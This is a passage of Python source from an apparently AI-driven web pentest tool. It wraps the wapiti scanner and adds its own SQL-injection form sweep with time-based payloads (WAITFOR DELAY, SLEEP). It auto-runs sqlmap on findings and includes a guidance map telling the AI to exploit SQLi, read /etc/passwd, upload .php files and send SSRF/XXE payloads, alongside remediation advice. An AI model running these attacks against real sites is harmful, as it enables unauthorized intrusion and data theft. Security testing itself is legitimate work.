    "backup", "brute_login_form", "buster", "cms", "crlf", "csrf", "exec",
    "file", "htaccess", "htp", "ldap", "log4shell", "methods",
    "network_device", "nikto", "permanentxss", "redirect", "shellshock",
    "spring4shell", "sql", "ssl", "ssrf", "takeover", "timesql", "upload",
    "wapp", "wp_enum", "xss", "xxe",
)
_WAPITI_SCOPE = ("url", "page", "folder", "subdomain", "domain", "punk")
_WAPITI_SEV = {0: "info", 1: "low", 2: "medium", 3: "high", 4: "critical"}
_WAPITI_SEV_RANK = {"info": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}
_WAPITI_MAX_EXPLOIT = 3  # số SQLi tối đa tự đẩy sang sqlmap_runner mỗi lượt

# v1.5.5: param phân trang mặc định BỎ TẤN CÔNG (--skip) — GET phase không đốt
# hết max-attack-time trên N URL ?page=N (example.com: 52 URL page → module sql
# chết trước khi tới form POST keyword). User override bằng skipped_parameters
# (chuỗi phân tách dấu phẩy hoặc list); truyền chuỗi rỗng để tắt skip.
_WAPITI_SKIP_PARAMS: tuple[str, ...] = (
    "page", "p", "pageindex", "page_id", "pageid", "offset", "limit",
    "start", "per_page", "perpage", "pageno", "page_number", "pagenumber",
    "pg",
)
# v1.5.5: field form bỏ qua trong form sweep (CSRF/captcha/honeypot/...)
_WAPITI_FORM_SKIP_FIELDS: tuple[str, ...] = (
    "csrf", "csrftoken", "token", "captcha", "honeypot", "__viewstate",
    "__eventvalidation", "authenticity_token", "_token", "submit", "button",
    "file", "image", "x", "y", "op", "action",
)
_WAPITI_MAX_SWEEP_FORMS = 10  # số field form POST tối đa sweep mỗi lượt
# v1.5.8 (Bug C): trần budget form sweep (giây) — sweep là BỔ TRỢ (wapiti đã
# chạy module sql), không được ăn hết budget tool sau khi wapiti xong. Trước
# đây sweep nhận NGUYÊN budget (vd 1200s) nên tổng thời gian wapiti_scan vượt
# xa max_scan_time + max_attack_time (user thấy 965.7s dù khai báo ~360s).
_WAPITI_SWEEP_MAX_BUDGET = 240

# v1.5.0: hướng dẫn BƯỚC TIẾP THEO theo category trong report JSON wapiti
# (category ổn định theo version — không phải tên module). Category chưa có
# trong map → fallback dùng solution từ classifications trong report.
# v1.5.3: TÁCH hướng dẫn wapiti thành 2 map — HƯỚNG KHAI THÁC và HƯỚNG KHẮC PHỤC.
# Mục "TỔNG HỢP LỖ HỔNG" trong output wapiti + JSON mapping (rule prompts 6/7) dùng 2 map này.
_WAPITI_EXPLOIT: dict[str, str] = {
    "SQL Injection": "sqlmap_runner TRƯỚC (technique='E', dbms theo DBMS trong finding) — nếu THẤT BẠI thì AI tự khai thác: sqli_blind_extract action='detect', known_confirmed=true. "
                     "v1.5.7 ENGINE-CONSISTENCY: engine LUÔN theo DBMS trong dòng info finding "
                     "(mysql|mssql|auto) — CẤM đổi engine khi wapiti đã report DBMS "
                     "(vd 'DBMS: MySQL' → engine='mysql', KHÔNG bao giờ mssql).",
    "Blind SQL Injection": "sqlmap_runner TRƯỚC (technique='T', dbms theo DBMS) — nếu THẤT BẠI thì AI tự khai thác: sqli_blind_extract cho kênh boolean/time.",
    "Command execution": "Xác minh bằng poc_executor (gọi endpoint với payload) — không chạy payload phá hoại; ghi nhận RCE nếu xác nhận.",
    "Path Traversal": "poc_executor thử đọc /etc/passwd (Linux) / C:/Windows/win.ini (Windows) theo curl_command; đánh giá mức lộ file.",
    "Server Side Request Forgery": "Gọi oob_listener trước, gửi payload SSRF trỏ interactsh domain trong log để bắt callback OOB.",
    "XXE": "Gọi oob_listener trước, inject XXE với external entity trỏ interactsh domain; đợi callback trong log.",
    "Reflected Cross Site Scripting": "Xác minh bằng trình duyệt (snapshot) với URL+payload trong curl_command; ghi nhận nếu script chạy.",
    "Stored Cross Site Scripting": "Xác minh bằng trình duyệt trên trang lưu output; nếu chạy → ảnh hưởng mọi user xem trang.",
    "HTML Injection": "Xem view-source trang: payload hiển thị thô — thấp hơn XSS nếu JS không chạy.",
    "Open Redirect": "Kiểm tra nhanh bằng curl -I theo curl_command (vị trí Location header).",
    "CRLF Injection": "headers_recon với payload trong curl_command — tìm header bị inject (vd Set-Cookie).",
    "Htaccess Bypass": "Thử các HTTP method khác (module methods) lên tài nguyên bị chặn; 200 kèm nội dung nhạy cảm = confirmed.",
    "Backup file": "Tải file backup (curl theo path) và soi nội dung — có thể chứa source/config rò rỉ.",
    "Potentially dangerous file": "Tải file theo curl_command; chạy trivy/wpscan nếu là source PHP/WordPress.",
    "Weak credentials": "Đăng nhập thủ công bằng credential vừa tìm; vào được → đổi mật khẩu ngay (khuyến nghị).",
    "Cross Site Request Forgery": "view-source form: không có token CSRF trên thao tác nhạy cảm = CSRF thật.",
    "Log4Shell": "Xác minh phiên bản Java/log4j (banner, headers, file jar lộ); payload OOB nếu dùng --dns-endpoint.",
    "Spring4Shell": "Xác minh phiên bản Spring (5.3.x < 5.3.18 / 5.2.x < 5.2.20) trước khi kết luận.",
    "Subdomain takeover": "Kiểm tra CNAME trỏ domain không tồn tại (dns_lookup/dig) và domain còn claim được không.",
    "NS takeover": "Kiểm tra NS record trỏ nhà cung cấp DNS không hoạt động; đổi NS ngay.",
    "TLS/SSL misconfigurations": "Re-check bằng detect_cms/sslscan; bỏ TLS < 1.2 và weak cipher.",
    "HTTP Strict Transport Security (HSTS)": "Bật Strict-Transport-Security (max-age >= 6 tháng) trên HTTPS.",
    "Content Security Policy Configuration": "Thêm CSP header (script-src, object-src...) để giảm XSS.",
    "Clickjacking Protection": "Thêm X-Frame-Options: DENY/SAMEORIGIN hoặc CSP frame-ancestors.",
    "Secure Flag cookie": "Thêm thuộc tính Secure cho cookie.",
    "HttpOnly Flag cookie": "Thêm thuộc tính HttpOnly cho cookie.",
    "Unencrypted Channels": "Chuyển toàn bộ traffic sang HTTPS + redirect 301 từ HTTP.",
    "Inconsistent Redirection": "Đồng bộ redirect HTTP→HTTPS cho mọi path (tránh redirect loop/leak).",
    "File upload": "Tải thử file .php nhỏ qua curl theo curl_command; upload trả 'aborted'/size:false → tạm dừng khai thác, retry khi server ổn định.",
    "_default": "Xác minh thủ công theo curl_command; chọn poc_executor/oob_listener phù hợp loại lỗ hổng.",
}

_WAPITI_FIX: dict[str, str] = {
    "SQL Injection": "Prepared statement/parameterized query cho MỌI truy vấn; cấm nối chuỗi SQL với input; phân quyền DB tối thiểu; ẩn chi tiết lỗi DB với client.",
    "Blind SQL Injection": "Prepared statement kể cả SQL động (ORDER BY/WHERE động); tách dữ liệu người dùng khỏi cú pháp SQL; loại bỏ kênh boolean/time khác biệt.",
    "Command execution": "Không gọi system()/exec()/passthru()/eval() với input; dùng allowlist hàm + tham số ràng buộc; chạy tiến trình user tối thiểu hoặc sandbox.",
    "Path Traversal": "Chuẩn hoá đường dẫn (realpath) và kiểm tra prefix thư mục gốc; cấm '..' và đường dẫn tuyệt đối từ input; serve file qua handler an toàn.",
    "Server Side Request Forgery": "Allowlist host/IP đích; cấm URL tự do từ client; chặn dải IP nội bộ (RFC1918/link-local/metadata); timeout ngắn.",
    "XXE": "Tắt DTD/external entity khi parse XML (libxml_disable_entity_loader, FEATURE_SECURE_PROCESSING); ngừng dùng XML cho dữ liệu không tin cậy.",
    "Reflected Cross Site Scripting": "Encode output theo context (HTML/attribute/JS/URL); CSP mạnh; validate input theo allowlist; không nội suy input vào HTML.",
    "Stored Cross Site Scripting": "Encode khi HIỂN THỊ dữ liệu người dùng đã lưu; CSP; sanitize bằng thư viện chuẩn (vd DOMPurify) nếu cần HTML phong phú.",
    "HTML Injection": "Encode HTML entities cho mọi output; phân biệt text node với markup; CSP.",
    "Open Redirect": "Không dùng URL đích từ tham số; validate host theo allowlist; dùng redirect mapping phía server.",
    "CRLF Injection": "Loại CR/LF khỏi input; không nối input vào header; dùng API set-header của framework.",
    "Htaccess Bypass": "Chuyển ACL lên tầng server (location/deny) thay vì chỉ .htaccess; tắt HTTP method không cần thiết.",
    "Backup file": "Xoá file backup/source khỏi docroot; cấm .bak/.old/.zip/.tar trong thư mục web; backup ngoài docroot.",
    "Potentially dangerous file": "Xoá file thừa khỏi docroot; chặn tải source (.php/.py...); permission tối thiểu.",
    "Weak credentials": "Mật khẩu mạnh + MFA; khoá tài khoản sau N lần sai; xoá credential mặc định.",
    "Cross Site Request Forgery": "Token CSRF đồng bộ + SameSite=Strict/Lax cho mọi thao tác thay đổi trạng thái; xác thực lại thao tác nhạy cảm.",
    "Log4Shell": "Nâng cấp log4j >= 2.17.1; tắt JNDI lookup nếu chưa vá (log4j2.formatMsgNoLookups=true); rà lớp phụ thuộc.",
    "Spring4Shell": "Nâng cấp Spring Framework 5.3.18+/5.2.20+; rà toàn bộ module dùng ClassLoader mặc định.",
    "Subdomain takeover": "Xoá/claim lại CNAME trỏ domain chết; không để DNS dangling; theo dõi cảnh báo.",
    "NS takeover": "Chuyển NS về nhà cung cấp DNS hoạt động; xoá glue record cũ; theo dõi hết hạn domain.",
    "TLS/SSL misconfigurations": "Bật TLS >= 1.2 (ưu tiên 1.3); tắt weak cipher (RC4/DES); đúng chuỗi certificate.",
    "HTTP Strict Transport Security (HSTS)": "Thêm header Strict-Transport-Security (max-age >= 31536000, includeSubDomains); đăng ký preload.",
    "Content Security Policy Configuration": "Thêm CSP: script-src/object-src/base-uri từ nguồn tin cậy; kèm report-uri.",
    "Clickjacking Protection": "Thêm X-Frame-Options: DENY/SAMEORIGIN hoặc CSP frame-ancestors; không nhúng trang nhạy cảm vào iframe.",
    "Secure Flag cookie": "Thêm thuộc tính Secure cho cookie trên HTTPS.",
    "HttpOnly Flag cookie": "Thêm thuộc tính HttpOnly cho cookie phiên.",
    "Unencrypted Channels": "Chuyển toàn bộ traffic sang HTTPS + redirect 301 từ HTTP; kèm HSTS.",
    "Inconsistent Redirection": "Đồng bộ redirect HTTP→HTTPS cho mọi path; tránh redirect loop/leak.",
    "File upload": "Kiểm tra nội dung thật (không tin extension/MIME từ client); lưu ngoài docroot + đổi tên; cấm thực thi thư mục upload; allowlist type/kích thước.",
    "_default": "Áp dụng fix đúng loại lỗ hổng; xoá dữ liệu nhạy cảm nếu đã lộ; xác minh lại sau khi vá.",
}


def _wapiti_parse_report(report_path: str) -> dict:
    """Parse report JSON của wapiti → dict chuẩn + dedupe finding."""
    with open(report_path, encoding="utf-8") as f:
        rep = json.load(f)
    if (not isinstance(rep, dict) or not isinstance(rep.get("infos"), dict)
            or not isinstance(rep.get("vulnerabilities"), dict)):
        raise ValueError("Wapiti report missing infos/vulnerabilities objects")
    infos = rep.get("infos") or {}
    vulns: dict = rep.get("vulnerabilities") or {}
    findings = []
    for cat, items in vulns.items():
        for it in items or []:
            if not isinstance(it, dict):
                continue
            findings.append({
                "category": cat,
                "module": str(it.get("module") or ""),
                "method": str(it.get("method") or "GET").upper(),
                "path": str(it.get("path") or ""),
                "parameter": str(it.get("parameter") or ""),
                "level": int(it.get("level") or 0),
                "info": str(it.get("info") or "").strip(),
                "wstg": it.get("wstg") or [],
                "http_request": str(it.get("http_request") or "").strip(),
                "curl_command": str(it.get("curl_command") or "").strip(),
                "referer": str(it.get("referer") or "").strip(),
            })
    # dedupe (category, method, path, parameter|curl) — giữ bản level cao nhất
    best: dict[tuple, dict] = {}
    for f in findings:
        k = (f["category"], f["method"], f["path"],
             f["parameter"] or f["curl_command"])
        if k not in best or f["level"] > best[k]["level"]:
            best[k] = f
    findings = sorted(best.values(),
                      key=lambda x: (_WAPITI_SEV_RANK.get(_WAPITI_SEV.get(x["level"], "info"), 0),
                                     x["category"], x["path"]),
                      reverse=True)
    return {
        "target": infos.get("target") or "",
        "date": infos.get("date") or "",
        "version": infos.get("version") or "",
        "scope": infos.get("scope") or "",
        "crawled": infos.get("crawled_pages_nbr") or 0,
        "findings": findings,
        "classifications": rep.get("classifications") or {},
    }


def _strip_wapiti_probe(value: str) -> str:
    """Bỏ hậu tố probe của wapiti (`¿'"(` = %C2%BF%27%22%28) khỏi giá trị
    tham số trong http_request để lấy lại form data GỐC cho sqlmap."""
    import urllib.parse as up
    d = up.unquote(value)
    for suf in ("%C2%BF%27%22%28", "%BF%27%22%28", "¿'\"("):
        if value.endswith(suf):
            return value[:-len(suf)]
        if d.endswith(suf):
            return up.quote(d[:-len(suf)], safe="")
    return value


def _wapiti_sqli_target(base_url: str, f: dict) -> tuple[str, str | None]:
    """(url tuyệt đối cho sqlmap, data POST hoặc None) từ finding wapiti."""
    b = base_url.rstrip("/")
    p = f["path"].lstrip("/")
    t = b + "/" + p if p else b
    if f["method"] == "POST":
        data = None
        if f["http_request"] and f["parameter"]:
            body = f["http_request"].split("\n\n", 1)[-1].split("\r\n\r\n", 1)[-1].strip()
            if body and "=" in body:
                parts: dict[str, str] = {}
                for kv in body.split("&"):
                    if "=" in kv:
                        k, v = kv.split("=", 1)
                        parts[k] = v
                raw = parts.get(f["parameter"], "")
                data = f"{f['parameter']}={_strip_wapiti_probe(raw)}"
        return t, data or (f"{f['parameter']}=" if f["parameter"] else None)
    if f["parameter"]:
        return t + "?" + f["parameter"] + "=1", None
    return t, None


# ─────────────────────────────────────────────
# v1.5.5: FORM SWEEP — tự tìm SQLi trên form POST mà wapiti crawl được
# (không cần user trỏ tay vào URL form). Đọc form từ session DB wapiti
# (--store-session) rồi test từng field: MSSQL error-based oracle →
# quote-differential → time-based (giới hạn).
# ─────────────────────────────────────────────


def _sweep_finding(base_url: str, path: str, param: str, evidence: str) -> dict:
    """Finding chuẩn cho form sweep — khớp schema _wapiti_parse_report.

    path phải là RELATIVE (urlparse(url).path + query) để dedupe với finding
    wapiti (key: category, method, path, parameter) và để _wapiti_sqli_target
    build đúng target sqlmap; URL đầy đủ nằm trong info.
    """
    from urllib.parse import urlparse
    p = urlparse(path)
    rel = p.path or "/"
    if p.query:
        rel += "?" + p.query
    full = f"{base_url.rstrip('/')}/{rel.lstrip('/')}"
    return {
        "category": "SQL Injection",
        "module": "sql-form-sweep",
        "method": "POST",
        "path": rel,
        "parameter": param,
        "level": 4,
        "info": f"{full} — form sweep (POST {param})",
        "wstg": ["WSTG-INPV-05"],
        "http_request": "",
        "curl_command": f"curl -s -X POST '{full}' -d '{param}=test'",
        "referer": "",
        "evidence": evidence,
    }


def _sweep_oracle(base_url: str, path: str, param: str, data: dict,
                  req_timeout: int) -> tuple[bool, str]:
    """MSSQL error-based oracle (MsSqlErrorOracle.detect) — tối đa 3 request.
    Trả (confirmed, evidence). In của oracle bắt qua redirect_stdout.
    """
    import contextlib
    import io
    try:
        from sqli_blind_poc import MsSqlErrorOracle
    except ImportError:  # khi tools.py được import từ nơi khác
        import importlib.util
        here = os.path.dirname(os.path.abspath(__file__))
        spec = importlib.util.spec_from_file_location(
            "sqli_blind_poc", os.path.join(here, "sqli_blind_poc.py"))
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        MsSqlErrorOracle = mod.MsSqlErrorOracle
    buf = io.StringIO()
    try:
        with contextlib.redirect_stdout(buf):
            oracle = MsSqlErrorOracle(base_url + "/" + path.lstrip("/"),
                                      method="post", param=param, data=data,
                                      timeout=req_timeout)
            ok = oracle.detect()
    except Exception as e:  # noqa: BLE001
        return False, f"oracle lỗi: {e}"
    ev = buf.getvalue().strip()
    return ok, ev or "oracle: không có output"


def _sweep_quote_diff(base_url: str, path: str, param: str, data: dict,
                     req_timeout: int) -> tuple[bool, str]:
    """Quote-differential — 3 request: baseline 'test' vs 'test'' vs "test'".
    Nháy đơn LÀM VỠ truy vấn (500/khác size) mà nháy đơn kép KHỚP baseline
    → điểm chèn SQLi xác nhận (không cần biết engine). Trả (confirmed, ev).
    """
    import requests
    url = base_url + "/" + path.lstrip("/")
    seed = "test"

    def send(value: str):
        try:
            body = {k: list(v) for k, v in data.items()}
            body[param] = [value]
            r = requests.post(url, data=body, timeout=req_timeout,
                              headers={"User-Agent": "Mozilla/5.0"})
            return r.status_code, len(r.content), r
        except requests.RequestException as e:
            return 0, 0, f"lỗi {e}"

    b_st, b_ln, resp_b = send(seed)
    q1_st, q1_ln, _ = send(seed + "'")
    q2_st, q2_ln, _ = send(seed + "''")
    ev = (f"baseline: status={b_st} len={b_ln} | quote-single: status={q1_st} "
          f"len={q1_ln} | quote-double: status={q2_st} len={q2_ln}")
    if b_st == 0:
        return False, ev + " | baseline lỗi kết nối"
    broken = (q1_st != b_st) or (abs(q1_ln - b_ln) > 50)
    match = (q2_st == b_st) and (abs(q2_ln - b_ln) <= 50)
    if broken and match:
        return True, ev + " | quote-single VỠ truy vấn, quote-double khớp baseline → SQLi"
    return False, ev


def _sweep_time_based(base_url: str, path: str, param: str, data: dict,
                      engine: str, req_timeout: int,
                      delay: int = 3) -> tuple[bool, str]:
    """Time-based 2-request single-payload: baseline vs WAITFOR DELAY/SLEEP.
    Chỉ gọi khi ≤5 field (kế hoạch v1.5.5). Trả (confirmed, ev).
    """
    import time as t
    import requests
    url = base_url + "/" + path.lstrip("/")
    if engine == "mssql":
        payload = f"'; WAITFOR DELAY '0:0:{delay}'-- -"
    else:
        payload = f"' OR SLEEP({delay})-- -"

    def send(value: str):
        try:
            body = {k: list(v) for k, v in data.items()}
            body[param] = [value]
            t0 = t.monotonic()
            r = requests.post(url, data=body, timeout=req_timeout + delay,
                              headers={"User-Agent": "Mozilla/5.0"})
            return r.status_code, t.monotonic() - t0
        except requests.RequestException:
            return 0, 0.0

    b_st, b_el = send("test")
    p_st, p_el = send(payload)
    ev = f"baseline: {b_el:.1f}s | payload: {p_el:.1f}s (delay={delay}s)"
    if p_st and p_el >= b_el + delay * 0.7:
        return True, ev + " | payload chậm hơn baseline → SQLi time-based"
    return False, ev


_engine_cache: dict[str, str] = {}


def _sweep_engine(base_url: str, req_timeout: int) -> str:
    """1 GET /host → _guess_engine, cache theo host (headers request của wapiti
    không chứa thông tin engine nên phải GET nhanh 1 lần)."""
    import requests
    from urllib.parse import urlparse
    host = urlparse(base_url).netloc
    if host in _engine_cache:
        return _engine_cache[host]
    eng = ""
    try:
        r = requests.get(base_url, timeout=min(req_timeout, 20),
                         headers={"User-Agent": "Mozilla/5.0"})
        eng = _guess_engine(r)
    except requests.RequestException:
        pass
    _engine_cache[host] = eng
    return eng


def _form_sweep(base_url: str, session_dir: str, budget: int, req_timeout: int,
                cookie: str = "") -> tuple[list[dict], list[str]]:
    """v1.5.5: đọc form POST từ session DB wapiti → tự test SQLi từng field.

    Trả (findings, log_lines). Không có DB/không có form → ([], []).
    Budget-aware: dừng khi budget - elapsed - 10. Rate 0.5s giữa các field.
    """
    import sqlite3
    import time as t
    dbs = [os.path.join(session_dir, f) for f in os.listdir(session_dir)
           if f.endswith(".db")]
    if not dbs:
        return [], ["[i] form sweep: không có session DB wapiti — bỏ qua"]
    findings: list[dict] = []
    logs: list[str] = []
    t0 = t.monotonic()
    engine = _sweep_engine(base_url, req_timeout)
    if engine:
        logs.append(f"[i] form sweep: engine ước lượng từ headers = {engine} (heuristic only; NOT confirmed DBMS or vulnerability)")
    seen: set[tuple] = set()
    for db in dbs:
        try:
            con = sqlite3.connect(f"file:{db}?mode=ro", uri=True)
        except Exception as e:  # noqa: BLE001
            logs.append(f"[i] form sweep: bỏ qua DB {os.path.basename(db)} ({e})")
            continue
        try:
            cur = con.cursor()
            cur.execute("SELECT p.path_id, p.name, p.value1, pa.path "
                        "FROM params p JOIN paths pa ON p.path_id=pa.path_id "
                        "WHERE p.type='POST'")
            rows = cur.fetchall()
        except Exception as e:  # noqa: BLE001
            logs.append(f"[i] form sweep: đọc session DB lỗi ({e})")
            con.close()
            continue
        con.close()
        forms: dict[int, dict] = {}
        for pid, name, val, path in rows:
            # session DB lưu URL ĐẦY ĐỦ (vd https://example.com/WebTinTuc/TimKiem)
            # → chuẩn hoá về RELATIVE (path + query) để test functions và
            # _sweep_finding dùng chung (dedupe + sqlmap target đúng).
            from urllib.parse import urlparse as _up
            _p = _up(str(path))
            rel = _p.path or "/"
            if _p.query:
                rel += "?" + _p.query
            forms.setdefault(pid, {"path": rel, "fields": []})
            forms[pid]["fields"].append((str(name), str(val or "")))
        for pid, form in forms.items():
            path = form["path"]
            fields = [f for f in form["fields"]
                      if f[0].lower() not in _WAPITI_FORM_SKIP_FIELDS]
            if not fields:
                continue
            fields = fields[:_WAPITI_MAX_SWEEP_FORMS]
            data = {n: [v] for n, v in form["fields"]}
            for name, _val in fields:
                if t.monotonic() - t0 > budget - 10:
                    logs.append("[i] form sweep: hết budget — dừng sớm")
                    return findings, logs
                key = ("POST", path, name)
                if key in seen:
                    continue
                seen.add(key)
                confirmed = False
                ev = ""
                # 1) MSSQL error-based oracle (chỉ khi engine ước lượng = mssql)
                if engine == "mssql":
                    ok, ev = _sweep_oracle(base_url, path, name, data, req_timeout)
                    if ok:
                        confirmed = True
                # 2) quote-differential (mọi engine)
                if not confirmed:
                    ok, ev2 = _sweep_quote_diff(base_url, path, name, data,
                                                req_timeout)
                    ev = ev2 if not ev else ev + "\n" + ev2
                    if ok:
                        confirmed = True
                # 3) time-based (chỉ khi ≤5 field — kế hoạch v1.5.5)
                if not confirmed and len(fields) <= 5:
                    ok, ev3 = _sweep_time_based(base_url, path, name, data,
                                                engine, req_timeout)
                    ev = ev + "\n" + ev3 if ev else ev3
                    if ok:
                        confirmed = True
                if confirmed:
                    findings.append(_sweep_finding(base_url, path, name, ev))
                    logs.append(f"[+] form sweep: SQLi CONFIRMED POST {path} "
                                f"param={name}")
                else:
                    logs.append(f"[-] form sweep: {path} param={name} — "
                                f"không nhiễm")
                t.sleep(0.5)  # rate limit nhẹ tránh WAF burst
    return findings, logs


def _wapiti_scan(**kw):
    """v1.5.0: wapiti 3.2.10 — crawler + TOÀN BỘ attack modules (29 module).

    Bounded: scope mặc định domain (cả website), depth/scan-time/attack-time có
    trần cứng, chạy `-f json` để parse chính xác. exploit=true (mặc định): tự
    chạy sqlmap_runner trên tối đa _WAPITI_MAX_EXPLOIT SQLi findings (giữ luật
    sqlmap-FIRST sau khi wapiti CONFIRMED). Mọi finding khác trả payload
    (curl_command/http_request) + guidance để model xác minh/khai thác tiếp.
    """
    import tempfile
    import time
    from urllib.parse import urlparse

    _need("wapiti")
    url = kw["url"].rstrip("/")
    if not urlparse(url).scheme in ("http", "https"):
        return f"[!] wapiti_scan: url phải là http(s):// — nhận: {kw['url']!r}"
    scope = str(kw.get("scope") or "domain").strip().lower()
    if scope not in _WAPITI_SCOPE:
        return ("[!] wapiti_scan: scope không hợp lệ — " + "/".join(_WAPITI_SCOPE)
                + f"; nhận: {scope!r}")
    mods_raw = str(kw.get("modules") or "").strip()
    if not mods_raw:
        mods = list(_WAPITI_MODULES)
    else:
        mods = [m.strip().lower() for m in re.split(r"[,; ]+", mods_raw) if m.strip()]
        bad = [m for m in mods if m not in _WAPITI_MODULES]
        if bad:
            return ("[!] wapiti_scan: module không hợp lệ: " + ", ".join(bad)
                    + "\n[i] Module hợp lệ: " + ", ".join(_WAPITI_MODULES))
        mods = list(dict.fromkeys(mods))

    depth = max(1, min(int(kw.get("depth") or 3), 10))
    tasks = max(1, min(int(kw.get("tasks") or 3), 8))
    req_timeout = max(5, min(int(kw.get("timeout") or 10), 30))
    # run budget: tôn trọng _timeout (dispatch cap) — scan để wapiti TỰ kết thúc
    # trước khi run_cmd giết (bài học nikto v1.4.4: -maxtime = _timeout-10).
    budget = int(kw.get("_timeout") or 300)
    scan_time = max(30, min(int(kw.get("max_scan_time") or min(budget - 20, 300)),
                            min(budget - 20, 1800)))
    attack_time = max(15, min(int(kw.get("max_attack_time") or 150),
                              max(15, scan_time // 2)))
    exploit = bool(kw.get("exploit", True))
    # v1.5.5: skipped_parameters — user override (chuỗi phẩy hoặc list);
    # rỗng = tắt skip. Mặc định skip param phân trang (--skip) để GET phase
    # không đốt hết max-attack-time trên N URL ?page=N trước khi tới form POST.
    skip_raw = kw.get("skipped_parameters")
    if skip_raw is None:
        skip_params = list(_WAPITI_SKIP_PARAMS)
    elif isinstance(skip_raw, (list, tuple)):
        skip_params = [str(s).strip() for s in skip_raw if str(s).strip()]
    else:
        skip_params = [s.strip() for s in str(skip_raw).split(",") if s.strip()]

    report_dir = tempfile.mkdtemp(prefix="aixsec-x_wapiti_")
    report_path = os.path.join(report_dir, "report.json")
    # v1.5.5: --store-session — wapiti lưu session/crawl DB vào thư mục riêng
    # để form sweep đọc form POST (params table) sau khi scan xong.
    session_dir = os.path.join(report_dir, "session")
    os.makedirs(session_dir, exist_ok=True)
    args = ["wapiti", "-u", url, "--scope", scope, "-m", ",".join(mods),
            "-d", str(depth), "--tasks", str(tasks),
            "--max-scan-time", str(scan_time), "--max-attack-time", str(attack_time),
            "-t", str(req_timeout), "-f", "json", "-o", report_path,
            "--flush-session", "--no-bugreport", "-v", "1",
            "--store-session", session_dir]
    for sp in skip_params:
        args += ["--skip", sp]
    if kw.get("cookie"):
        args += ["-C", str(kw["cookie"])]
    t0 = time.monotonic()
    # v1.5.1 (Bug 2): truyền NGUYÊN budget thay vì min(budget, scan_time+60) —
    # trước đây run_cmd giết wapiti khi scan_time+60 trôi qua dù budget còn dư,
    # wapiti chưa kịp ghi report JSON nên outcome=error 'thiếu report' mọi lần.
    # Dispatcher cấp max_scan_time + cleanup grace (bounded); run_cmd là lưới
    # an toàn nếu Wapiti không tự thoát sau thời hạn scan/report.
    out = run_cmd(args, budget, max_chars=6000)
    # 1) lỗi thực thi (timeout / thiếu binary /...) — KHÔNG kết luận gì từ lần chạy này
    if out.startswith("[!]"):
        err_line = out.splitlines()[0].lstrip("[!] ").strip()
        return (f"[!] wapiti không hoàn tất (lỗi thực thi): {err_line}"
                f"\n[i] lệnh: {' '.join(args)}"
                f"\n[i] Gợi ý: giảm scope (page/folder), giảm modules (vd 'sql,xss'), "
                f"tăng WEBX_TOOL_TIMEOUT cho scan dài.")
    # 2) report JSON không tồn tại / hỏng → lỗi (không bịa kết quả)
    if not os.path.exists(report_path):
        return (f"[!] wapiti không tạo được report JSON ({report_path}).\n"
                f"[i] lệnh: {' '.join(args)}\n{out[-1000:]}")
    try:
        rep = _wapiti_parse_report(report_path)
    except Exception as e:  # noqa: BLE001 — JSON hỏng = lỗi thực thi
        return (f"[!] wapiti report JSON không đọc được: {e}"
                f"\n[i] lệnh: {' '.join(args)}\n{out[-1000:]}")

    findings = rep["findings"]
    craw = rep["crawled"] or 0
    ver = rep["version"].replace("Wapiti ", "")

    # ── v1.5.5: FORM SWEEP — tự tìm SQLi trên form POST từ session DB wapiti
    # (không cần user trỏ tay vào URL form). Chạy NGAY CẢ khi wapiti 0 finding;
    # kết quả merge vào findings TRƯỚC early-return và trước summary/auto-exploit.
    # v1.5.8 (Bug C): sweep nhận budget CÒN LẠI (budget - elapsed) thay vì nguyên
    # budget — trước đây sweep chạy sau wapiti với đầy đủ budget nên có thể ăn
    # thêm hàng trăm giây, đẩy tổng thời gian vượt xa giới hạn khai báo. Trần
    # _WAPITI_SWEEP_MAX_BUDGET giữ sweep ở mức bổ trợ; sàn 30s cho ít nhất vài field.
    elapsed = time.monotonic() - t0
    sweep_budget = max(30, min(int(budget - elapsed), _WAPITI_SWEEP_MAX_BUDGET))
    sweep_findings, sweep_logs = _form_sweep(url, session_dir, sweep_budget,
                                             req_timeout, cookie=str(kw.get("cookie") or ""))
    if sweep_findings:
        existing = {(f["category"], f["method"], f["path"], f["parameter"])
                    for f in findings}
        for sf in sweep_findings:
            k = (sf["category"], sf["method"], sf["path"], sf["parameter"])
            if k not in existing:
                findings.append(sf)
                existing.add(k)
        findings.sort(key=lambda x: (_WAPITI_SEV_RANK.get(_WAPITI_SEV.get(x["level"], "info"), 0),
                                     x["category"], x["path"]), reverse=True)

    # v1.7.0 (structured ToolResult): data = findings giảm còn shape khai báo
    # (hostile-safe: .get, không truyền dict gốc từ report).
    wdata = {"target": rep.get("target") or url, "scope": rep.get("scope") or scope,
             "crawled": craw, "report_path": report_path,
             "findings": [{"category": str(f.get("category") or ""),
                            "level": str(f.get("level") or "info"),
                            "method": str(f.get("method") or "GET"),
                            "path": str(f.get("path") or ""),
                            "parameter": str(f.get("parameter") or ""),
                            "module": str(f.get("module") or "")}
                           for f in findings]}

    lines = [f"[✓] wapiti QUÉT XONG (v{ver}) — {rep['target']} "
             f"[scope={rep['scope']}, {craw} URL/form, {len(findings)} mục, "
             f"{elapsed:.0f}s]"]
    if sweep_logs:
        lines.append("[i] FORM SWEEP (tự tìm SQLi trên form POST):")
        lines.extend(sweep_logs)
    if not findings:
        lines.append("[i] KHÔNG phát hiện lỗ hổng nào trong phạm vi này.")
        lines.append("[→] BƯỚC TIẾP THEO: hẹp phạm vi (scope=page/folder, -d sâu hơn), "
                     "bật nhóm module (vd 'sql,xss,exec'), hoặc chạy http_probe tìm "
                     "thêm endpoint/form rồi wapiti_scan lại từng URL cụ thể.")
        return ("\n".join(lines) + f"\n[i] report JSON (bằng chứng): {report_path}", wdata)

    sev_sort = ["critical", "high", "medium", "low", "info"]
    by_sev: dict[str, list[dict]] = {s: [] for s in sev_sort}
    for f in findings:
        s = _WAPITI_SEV.get(f["level"], "info")
        by_sev.setdefault(s, []).append(f)
    n_noninfo = sum(len(v) for k, v in by_sev.items() if k != "info")
    if n_noninfo:
        lines.append(f"[✓] Phát hiện {n_noninfo} lỗ hổng (không tính mục info):")
    else:
        lines.append("[i] Chỉ có mục mức info (fingerprint/headers/cookie flags) — "
                     "chưa có lỗ hổng mức khai thác.")
    detail_budget = 8  # in chi tiết đầy đủ cho 8 mục nặng nhất (tránh tràn context)
    shown = 0
    for s in sev_sort:
        for f in by_sev.get(s, []):
            loc = f["method"] + " " + (f["path"] or "?")
            p = f" (param={f['parameter']})" if f["parameter"] else ""
            m = f" [module={f['module']}]" if f["module"] else ""
